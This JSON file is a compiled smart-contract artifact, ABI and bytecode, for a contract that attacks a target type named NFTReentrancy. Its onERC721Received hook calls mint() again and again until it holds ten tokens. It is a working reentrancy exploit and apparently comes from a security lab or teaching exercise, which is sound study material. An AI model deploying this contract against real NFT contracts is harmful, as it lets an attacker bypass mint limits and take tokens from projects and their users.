{"abi":[{"type":"constructor","inputs":[{"name":"_nftAddr","type":"address","internalType":"contract NFTReentrancy"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"nft","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract NFTReentrancy"}],"stateMutability":"view"},{"type":"function","name":"onERC721Received","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b50604051610746380380610746833981810160405281019061003191906100e5565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f5ffd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6106298061011d5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063150b7a021461004357806347ccca02146100735780639e5faafc14610091575b5f5ffd5b61005d60048036038101906100589190610445565b61009b565b60405161006a91906104ff565b60405180910390f35b61007b6101ca565b6040516100889190610573565b60405180910390f35b6100996101ee565b005b5f600a5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016100f7919061059b565b602060405180830381865afa158015610112573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013691906105c8565b10156101b8575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631249c58b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101a1575f5ffd5b505af11580156101b3573d5f5f3e3d5ffd5b505050505b63150b7a0260e01b9050949350505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631249c58b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610253575f5ffd5b505af1158015610265573d5f5f3e3d5ffd5b50505050565b5f604051905090565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102a58261027c565b9050919050565b6102b58161029b565b81146102bf575f5ffd5b50565b5f813590506102d0816102ac565b92915050565b5f819050919050565b6102e8816102d6565b81146102f2575f5ffd5b50565b5f81359050610303816102df565b92915050565b5f5ffd5b5f5ffd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61035782610311565b810181811067ffffffffffffffff8211171561037657610375610321565b5b80604052505050565b5f61038861026b565b9050610394828261034e565b919050565b5f67ffffffffffffffff8211156103b3576103b2610321565b5b6103bc82610311565b9050602081019050919050565b828183375f83830152505050565b5f6103e96103e484610399565b61037f565b9050828152602081018484840111156104055761040461030d565b5b6104108482856103c9565b509392505050565b5f82601f83011261042c5761042b610309565b5b813561043c8482602086016103d7565b91505092915050565b5f5f5f5f6080858703121561045d5761045c610274565b5b5f61046a878288016102c2565b945050602061047b878288016102c2565b935050604061048c878288016102f5565b925050606085013567ffffffffffffffff8111156104ad576104ac610278565b5b6104b987828801610418565b91505092959194509250565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6104f9816104c5565b82525050565b5f6020820190506105125f8301846104f0565b92915050565b5f819050919050565b5f61053b6105366105318461027c565b610518565b61027c565b9050919050565b5f61054c82610521565b9050919050565b5f61055d82610542565b9050919050565b61056d81610553565b82525050565b5f6020820190506105865f830184610564565b92915050565b6105958161029b565b82525050565b5f6020820190506105ae5f83018461058c565b92915050565b5f815190506105c2816102df565b92915050565b5f602082840312156105dd576105dc610274565b5b5f6105ea848285016105b4565b9150509291505056fea2646970667358221220518e83b101de3c67a12b2e4b79f669aca53f89f08c99beb67e4c4b3833ac492264736f6c63430008220033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","nft()":"47ccca02","onERC721Received(address,address,uint256,bytes)":"150b7a02"},"id":138}